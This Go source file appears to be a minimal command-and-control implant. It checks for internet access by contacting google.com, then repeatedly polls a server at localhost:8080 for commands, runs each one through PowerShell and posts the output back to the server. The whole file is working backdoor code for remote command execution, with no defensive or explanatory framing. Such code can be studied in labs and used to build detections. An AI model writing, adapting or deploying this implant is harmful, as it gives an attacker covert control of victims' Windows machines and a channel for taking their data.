package main

import (
    "fmt"
    "net/http"
	"os"
	"io/ioutil"
    "os/exec"
	"time"
	"strings"
)

func get_command()([]byte){
	requestURL := fmt.Sprintf("http://localhost:8080/getcommand")
	req, err := http.NewRequest(http.MethodGet, requestURL, nil)
	req.Header.Set("Authorization", "1")
	if err != nil {
		fmt.Printf("client: could not create request: %s\n", err)
		os.Exit(1)
	}

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("client: error making http request: %s\n", err)
		os.Exit(1)
	}
	resBody,_ := ioutil.ReadAll(res.Body)
	return resBody
}

func Size1234() {
    _, err := http.Get("https://google.com")
if err != nil {
    os.Exit(4)
}
}

func send_response(out []byte){
	client := &http.Client{}
	r := strings.NewReader("rfile="+string(out))
	req, _ := http.NewRequest("POST", "http://localhost:8080/response", r)
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	req.Header.Set("Authorization", "1")
	_, _ = client.Do(req)


}

func main() {
	Size1234()

	for true {

	resBody:= get_command()
	
	if (strings.TrimSpace(string(resBody)) == "none"){
		time.Sleep(1 * time.Second)
	}else if  (string(resBody) == "Exit"){
		os.Exit(0)
	}else{
		cmd := exec.Command("powershell", "-nologo", "-noprofile")
		stdin, _ := cmd.StdinPipe()
		go func() {
		   defer stdin.Close()
		   fmt.Fprintln(stdin, string(resBody))
		}()
		out, _ := cmd.CombinedOutput()
		send_response(out)
	 
	}
	}
}
